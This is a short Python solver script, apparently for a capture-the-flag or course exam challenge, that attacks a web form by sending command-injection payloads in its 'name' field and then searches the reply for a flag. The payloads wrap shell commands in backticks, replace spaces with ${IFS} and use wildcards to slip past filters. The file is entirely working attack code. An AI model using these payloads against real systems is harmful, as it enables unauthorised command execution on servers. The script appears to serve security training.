import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

URL = "https://q5.midterm.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def main(self):
        LS_ROOT_PAYLOAD = """`ls${IFS}/`"""
        response = self.session.post(URL, data={"name": LS_ROOT_PAYLOAD, "debug": "false"})

        PAYLOAD = """`../???????`"""
        response = self.session.post(URL, data={"name": PAYLOAD, "debug": "false"})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()
